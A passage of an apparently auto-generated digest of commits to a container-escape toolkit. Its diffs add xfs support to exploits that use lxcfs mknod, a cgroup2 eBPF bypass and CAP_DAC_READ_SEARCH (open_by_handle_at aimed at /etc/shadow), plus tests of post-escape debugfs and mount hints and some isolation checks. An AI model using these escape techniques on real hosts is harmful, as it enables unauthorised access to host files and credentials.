+			fsType: "xfs",
+			device: "cdk_mknod_result",
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" cdk_mknod_result`,
+				"mount -t xfs -o ro cdk_mknod_result /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "lxcfs rw ext4",
+			fsType: "ext4",
+			device: "host_dev",
+			expected: []string{
+				"debugfs -w host_dev",
+				"mount -t ext4 -o ro host_dev /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "lxcfs rw xfs",
+			fsType: "xfs",
+			device: "host_dev",
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" host_dev`,
+				"mount -t xfs -o ro host_dev /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "cgroup2 ebpf bypass ext4",
+			fsType: "ext4",
+			device: "./cdk_mknod_v2_result",
+			expected: []string{
+				"debugfs -w ./cdk_mknod_v2_result",
+				"mount -t ext4 -o ro ./cdk_mknod_v2_result /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "cgroup2 ebpf bypass xfs",
+			fsType: "xfs",
+			device: "./cdk_mknod_v2_result",
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" ./cdk_mknod_v2_result`,
+				"mount -t xfs -o ro ./cdk_mknod_v2_result /tmp/cdkmnt",
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := blockDeviceBrowseHint(tt.fsType, tt.device, func(name string) bool {
+				return name == "debugfs" || name == "xfs_db" || name == "mount"
+			})
+			for _, want := range tt.expected {
+				if !strings.Contains(got, want) {
+					t.Fatalf("blockDeviceBrowseHint(%q, %q) = %q, want substring %q", tt.fsType, tt.device, got, want)
+				}
+			}
+		})
+	}
+}
```

**File**: `pkg/exploit/escaping/block_device_hint_test.go` (added, +95/-0)
```diff
@@ -0,0 +1,95 @@
+package escaping
+
+import (
+	"strings"
+	"testing"
+)
+
+func TestBlockDeviceBrowseHint(t *testing.T) {
+	tests := []struct {
+		name     string
+		fsType   string
+		tools    map[string]bool
+		expected []string
+	}{
+		{
+			name:   "ext4 prefers debugfs when available",
+			fsType: "ext4",
+			tools: map[string]bool{
+				"debugfs": true,
+				"mount":   true,
+			},
+			expected: []string{
+				"debugfs -w ./device",
+				"mount -t ext4 -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "ext4 falls back to mount",
+			fsType: "ext4",
+			tools: map[string]bool{
+				"mount": true,
+			},
+			expected: []string{
+				`host filesystem type is "ext4"`,
+				"mount -t ext4 -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "xfs prefers xfs_db when available",
+			fsType: "xfs",
+			tools: map[string]bool{
+				"xfs_db": true,
+				"mount":  true,
+			},
+			expected: []string{
+				`xfs_db -x -c "inode 128" -c "ls" ./device`,
+				"mount -t xfs -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "xfs falls back to mount",
+			fsType: "xfs",
+			tools: map[string]bool{
+				"mount": true,
+			},
+			expected: []string{
+				`host filesystem type is "xfs"`,
+				"mount -t xfs -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "unknown fs uses mount when available",
+			fsType: "btrfs",
+			tools: map[string]bool{
+				"mount": true,
+			},
+			expected: []string{
+				`host filesystem type is "btrfs"`,
+				"mount -t btrfs -o ro ./device /tmp/cdkmnt",
+			},
+		},
+		{
+			name:   "no tools falls back to generic message",
+			fsType: "xfs",
+			tools:  map[string]bool{},
+			expected: []string{
+				`host filesystem type is "xfs"`,
+				`A block device was created at ./device`,
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := blockDeviceBrowseHint(tt.fsType, "./device", func(name string) bool {
+				return tt.tools[name]
+			})
+			for _, want := range tt.expected {
+				if !strings.Contains(got, want) {
+					t.Fatalf("blockDeviceBrowseHint(%q) = %q, want substring %q", tt.fsType, got, want)
+				}
+			}
+		})
+	}
+}
```

**File**: `pkg/exploit/escaping/cgroup2_ebpf_bypass.go` (modified, +1/-1)
```diff
@@ -181,7 +181,7 @@ func (p cgroup2EbpfBypassS) Run() bool {
 				return false
 			} else {
 				log.Println("Exploit success! Device node created at './cdk_mknod_v2_result'")
-				log.Println("Run 'debugfs -w ./cdk_mknod_v2_result' to browse host files.")
+				log.Println(runtimeBlockDeviceBrowseHint(mi.Fstype, "./cdk_mknod_v2_result"))
 				return true
 			}
 		}
```

**File**: `pkg/exploit/escaping/lxcfs_rw_mknod.go` (modified, +3/-13)
```diff
@@ -86,6 +86,7 @@ func ExploitLXCFS() bool {
 	var podCgroupPath string
 	var devicesAllowPath, devicesListPath string
 	var deviceMarjor, deviceMinor string
+	var deviceFsType string
 	var filterString string
 
 	mountInfos, err := util.GetMountInfo()
@@ -116,6 +117,7 @@ func ExploitLXCFS() bool {
 		if util.FindTargetDeviceID(&mi) {
 			deviceMarjor = mi.Major
 			deviceMinor = mi.Minor
+			deviceFsType = mi.Fstype
 		}
 	}
 
@@ -141,24 +143,12 @@ func ExploitLXCFS() bool {
 			log.Printf("mknod err: %v", err)
 			return false
 		}
-		log.Printf("exploit success, run \"debugfs -w host_dev\".")
-		if !CheckDebugfs() {
-			log.Printf("if debugfs can not used, may be you can try to run `./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads`")
-		}
+		log.Printf("exploit success, %s", runtimeBlockDeviceBrowseHint(deviceFsType, "host_dev"))
 		return true
 	}
 	return false
 }
 
-// CheckDebugfs check if debugfs is installed
-func CheckDebugfs() bool {
-	_, err := os.Stat("/usr/bin/debugfs")
-	if err != nil {
-		return false
-	}
-	return true
-}
-
 type lxcfsRWS struct{ base.BaseExploit }
 
 func (l lxcfsRWS) Desc() string {
```

---

### Incident Patch 9: `c712dbbe` (2026-04-02)
**Commit Message**: fix(exp): support xfs in cap-dac-read-search

**File**: `pkg/exploit/escaping/cap_dac_read_search.go` (modified, +31/-6)
```diff
@@ -36,9 +36,11 @@ import (
 )
 
 const (
-	defaultRef    = "/etc/hostname"
-	defaultTarget = "/etc/shadow"
-	defaultShell  = "/bin/bash"
+	defaultRef     = "/etc/hostname"
+	defaultTarget  = "/etc/shadow"
+	defaultShell   = "/bin/bash"
+	ext4SuperMagic = 0xEF53
+	xfsSuperMagic  = 0x58465342
 )
 
 // plugin interface
@@ -111,16 +113,39 @@ func execCommand(cmdSlice []string) {
 	}
 }
 
+func rootFileHandle(ref string) (unix.FileHandle, error) {
+	var stat unix.Statfs_t
+	if err := unix.Statfs(ref, &stat); err != nil {
+		return unix.FileHandle{}, fmt.Errorf("statfs %s: %w", ref, err)
+	}
+
+	return rootFileHandleForFsType(int64(stat.Type))
+}
+
+func rootFileHandleForFsType(fsType int64) (unix.FileHandle, error) {
+	switch fsType {
+	case ext4SuperMagic:
+		// inode of / is always 2 for ext4, and i_generation is always 0.
+		return unix.NewFileHandle(1, []byte{0x02, 0, 0, 0, 0, 0, 0, 0}), nil
+	case xfsSuperMagic:
+		// The XFS root inode is 128; its export handle is a 12-byte fid.
+		return unix.NewFileHandle(129, []byte{0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}), nil
+	default:
+		return unix.FileHandle{}, fmt.Errorf("unsupported filesystem type 0x%x", uint64(fsType))
+	}
+}
+
 func CapDacReadSearchExploit(target, ref string, chroot bool, cmd []string) error {
 	// reference something bind mounted to container from host
 	fd, err := unix.Open(ref, unix.O_RDONLY, 0)
 	if err != nil {
 		log.Fatalf("[-] Open: %v\n", err)
 	}
 
-	// inode of / is always 2 for ext4: https://ext4.wiki.kernel.org/index.php/Ext4_Disk_Layout
-	// and i_generation is always 0, so handle is always 0x0000000000000002
-	h := unix.NewFileHandle(1, []byte{0x02, 0, 0, 0, 0, 0, 0, 0})
+	h, err := rootFileHandle(ref)
+	if err != nil {
+		log.Fatalf("[-] Resolve root handle: %v\n", err)
+	}
 
 	fd, err = unix.OpenByHandleAt(fd, h, 0)
 	if err != nil {
```

**File**: `pkg/exploit/escaping/cap_dac_read_search_test.go` (modified, +44/-0)
```diff
@@ -47,3 +47,47 @@ func TestWriteString(t *testing.T) {
 	fmt.Println(exploit.Desc())
 
 }
+
+func TestRootFileHandle(t *testing.T) {
+	tests := []struct {
+		name       string
+		fsType     int64
+		handleType int32
+		handle     []byte
+	}{
+		{
+			name:       "ext4",
+			fsType:     ext4SuperMagic,
+			handleType: 1,
+			handle:     []byte{0x02, 0, 0, 0, 0, 0, 0, 0},
+		},
+		{
+			name:       "xfs",
+			fsType:     xfsSuperMagic,
+			handleType: 129,
+			handle:     []byte{0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			h, err := rootFileHandleForFsType(tt.fsType)
+			if err != nil {
+				t.Fatalf("rootFileHandleForFsType(%#x): %v", tt.fsType, err)
+			}
+
+			if h.Type() != tt.handleType {
+				t.Fatalf("handle type = %d, want %d", h.Type(), tt.handleType)
+			}
+			if got := h.Bytes(); string(got) != string(tt.handle) {
+				t.Fatalf("handle bytes = %v, want %v", got, tt.handle)
+			}
+		})
+	}
+}
+
+func TestRootFileHandleForFsTypeUnsupported(t *testing.T) {
+	if _, err := rootFileHandleForFsType(0x12345678); err == nil {
+		t.Fatal("expected unsupported filesystem error")
+	}
+}
```

---

### Incident Patch 10: `7c44abe9` (2026-02-23)
**Commit Message**: Add container security isolation checks to evaluate module

Co-authored-by: neargle <7868679+neargle@users.noreply.github.com>

**File**: `go.mod` (modified, +1/-1)
```diff
@@ -22,7 +22,7 @@ require (
 	github.com/stretchr/testify v1.7.0
 	github.com/tidwall/gjson v1.9.3
 	github.com/tidwall/sjson v1.1.4
-	golang.org/x/net v0.0.0-20220630215102-69896b714898
+	golang.org/x/net v0.0.0-20220630215102-69896b714898 // indirect
 	golang.org/x/sync v0.0.0-20210220032951-036812b2e83c
 	golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
 	gopkg.in/check.v1 v1.0.0-20190902080502-41f04d3bba15 // indirect
```

**File**: `go.sum` (modified, +0/-2)
```diff
@@ -30,7 +30,6 @@ github.com/go-ole/go-ole v1.2.4/go.mod h1:XCwSNxSkXRo4vlyPy93sltvi/qJq0jqQhjqQNI
 github.com/gogo/protobuf v1.3.1/go.mod h1:SlYgWuQ5SjCEi6WLHjHCa1yvBfUnHcTbrrZtXPKa29o=
 github.com/gogo/protobuf v1.3.2 h1:Ov1cvc58UF3b5XjBnZv7+opcTcQFZebYjWzi34vdm4Q=
 github.com/gogo/protobuf v1.3.2/go.mod h1:P1XiOD3dCwIKUDQYPy72D8LYyHL2YPYrpS2s69NZV8Q=
-github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b h1:VKtxabqXZkF25pY9ekfRL6a582T4P37/31XEstQ5p58=
 github.com/golang/glog v0.0.0-20160126235308-23def4e6c14b/go.mod h1:SBH7ygxi8pfUlaOkMMuAQtPIUF8ecWP5IEl/CR7VP2Q=
 github.com/golang/mock v1.1.1/go.mod h1:oTYuIxOrZwtPieC+H1uAHpcLFnEyAGVDL/k47Jfbm0A=
 github.com/golang/protobuf v1.2.0/go.mod h1:6lQm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=
@@ -157,7 +156,6 @@ golang.org/x/tools v0.0.0-20210106214847-113979e3529a/go.mod h1:emZCQorbCU4vsT4f
 golang.org/x/xerrors v0.0.0-20190717185122-a985d3407aa7/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
 golang.org/x/xerrors v0.0.0-20191011141410-1b5146add898/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
 golang.org/x/xerrors v0.0.0-20191204190536-9bdfabe68543/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
-golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1 h1:go1bK/D/BFZV2I8cIQd1NKEZ+0owSTG1fDTci4IqFcE=
 golang.org/x/xerrors v0.0.0-20200804184101-5ec99f83aff1/go.mod h1:I/5z698sn9Ka8TeJc9MKroUUfqBBauWjQqLJ2OPfmY0=
 google.golang.org/appengine v1.1.0/go.mod h1:EbEs0AVv82hx2wNQdGPgUI5lhzA/G0D9YwlJXL52JkM=
 google.golang.org/appengine v1.4.0/go.mod h1:xpcJRLb0r/rnEns0DIKYYv+WjYCduHsrkT7/EB5XEv4=
```

**File**: `pkg/evaluate/categories.go` (modified, +6/-0)
```diff
@@ -85,4 +85,10 @@ var (
 		DefaultProfiles: []string{ProfileExtended, ProfileAdditional},
 		Order:           1400,
 	}
+	CategorySecurity = CategorySpec{
+		ID:              "information.security",
+		Title:           "Information Gathering - Container Security",
+		DefaultProfiles: []string{ProfileBasic, ProfileExtended},
+		Order:           1500,
+	}
 )
```

**File**: `pkg/evaluate/security_info.go` (modified, +216/-1)
```diff
@@ -16,6 +16,221 @@ limitations under the License.
 
 package evaluate
 
-func SecurityInfo() {
+import (
+	"bufio"
+	"compress/gzip"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"strings"
+)
 
+// namespaceTypes lists the Linux namespaces relevant to container isolation.
+var namespaceTypes = []string{"cgroup", "ipc", "mnt", "net", "pid", "uts"}
+
+// CheckNamespaceIsolation compares /proc/1/ns/<ns> and /proc/self/ns/<ns> for
+// each namespace type. If the symlink targets differ, the namespace is isolated.
+func CheckNamespaceIsolation() {
+	log.Println("Namespace isolation status:")
+	for _, ns := range namespaceTypes {
+		initTarget, err1 := os.Readlink(fmt.Sprintf("/proc/1/ns/%s", ns))
+		selfTarget, err2 := os.Readlink(fmt.Sprintf("/proc/self/ns/%s", ns))
+		if err1 != nil || err2 != nil {
+			log.Printf("\t%s: unable to read namespace links", ns)
+			continue
+		}
+		if initTarget != selfTarget {
+			fmt.Printf("\t%s: isolated (%s)\n", ns, selfTarget)
+		} else {
+			fmt.Printf("\t%s: NOT isolated (shared with host, %s)\n", ns, selfTarget)
+		}
+	}
+}
+
+// CheckSeccompStatus reads the Seccomp field from /proc/self/status and reports
+// whether Seccomp is disabled (0), strict (1), or filter (2) mode.
+func CheckSeccompStatus() {
+	data, err := ioutil.ReadFile("/proc/self/status")
+	if err != nil {
+		log.Printf("seccomp: unable to read /proc/self/status: %v", err)
+		return
+	}
+
+	scanner := bufio.NewScanner(strings.NewReader(string(data)))
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.HasPrefix(line, "Seccomp:") {
+			parts := strings.Fields(line)
+			if len(parts) < 2 {
+				log.Println("seccomp: malformed Seccomp line")
+				return
+			}
+			switch parts[1] {
+			case "0":
+				log.Println("Seccomp: disabled")
+			case "1":
+				log.Println("Seccomp: strict mode (1)")
+			case "2":
+				log.Println("Seccomp: filter mode (2)")
+			default:
+				log.Printf("Seccomp: unknown value %s", parts[1])
+			}
+			return
+		}
+	}
+	log.Println("Seccomp: field not found in /proc/self/status (kernel may not support Seccomp)")
+}
+
+// CheckSeccompKernelSupport reports whether the running kernel was compiled with
+// Seccomp support by checking for the Seccomp field in /proc/self/status and,
+// optionally, the kernel config.
+func CheckSeccompKernelSupport() {
+	// The presence of the "Seccomp:" line in /proc/self/status indicates support.
+	data, err := ioutil.ReadFile("/proc/self/status")
+	if err != nil {
+		log.Printf("seccomp: unable to read /proc/self/status: %v", err)
+		return
+	}
+	if strings.Contains(string(data), "Seccomp:") {
+		log.Println("Seccomp: kernel supports Seccomp")
+	} else {
+		log.Println("Seccomp: kernel does NOT support Seccomp")
+	}
+
+	// Additional confirmation via kernel config when available.
+	if val, ok := readKernelConfigOption("CONFIG_SECCOMP"); ok {
+		log.Printf("Seccomp: kernel config CONFIG_SECCOMP=%s", val)
+	}
+}
+
+// CheckSELinux detects whether SELinux is present and enforcing.
+func CheckSELinux() {
+	// /sys/fs/selinux/enforce exists only when SELinux is compiled in and mounted.
+	enforceFile := "/sys/fs/selinux/enforce"
+	data, err := ioutil.ReadFile(enforceFile)
+	if err != nil {
+		log.Println("SELinux: not detected (no selinuxfs)")
+		return
+	}
+	switch strings.TrimSpace(string(data)) {
+	case "1":
+		log.Println("SELinux: enforcing")
+	case "0":
+		log.Println("SELinux: permissive (loaded but not enforcing)")
+	default:
+		log.Printf("SELinux: unexpected enforce value %q", strings.TrimSpace(string(data)))
+	}
+
+	// Show the container's SELinux label if available.
+	if label, err := ioutil.ReadFile("/proc/self/attr/current"); err == nil {
+		trimmed := strings.TrimRight(string(label), "\x00\n")
+		log.Printf("SELinux: container label: %s", trimmed)
+	}
+}
+
+// CheckAppArmor inspects kernel compile options, boot parameters, runtime
+// status, and the active AppArmor profile for the current process.
+func CheckAppArmor() {
+	// 1. Kernel compile option.
+	if val, ok
```

#### Recent Merged Pull Requests:
- **PR #134** (2026-04-30): fix: CVE-2026-31431 copy-fail  (non-root→root & x86_64 only) (@neargle)
- **PR #132** (2026-04-30): Updating documentation and wiki for exp limitations (@Copilot)
- **PR #131** (2026-04-30): fix: two compile errors in copy-fail CVE-2026-31431 exploit (@Copilot)
- **PR #130** (2026-04-30): feat: add CVE-2026-31431 copy-fail privilege escalation exploit (@Copilot)
- **PR #129** (2026-05-01): fix(exp): improve xfs exploit support (@LioTree)
- **PR #126** (2026-02-23): Add container security isolation checks to evaluate module (@Copilot)
- **PR #125** (2026-02-23): add cgroup2_ebpf_bypass exploit for container escape (@ibranch7)
- **PR #123** (2025-11-05): fix(eva): rename service discovery file (@neargle)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
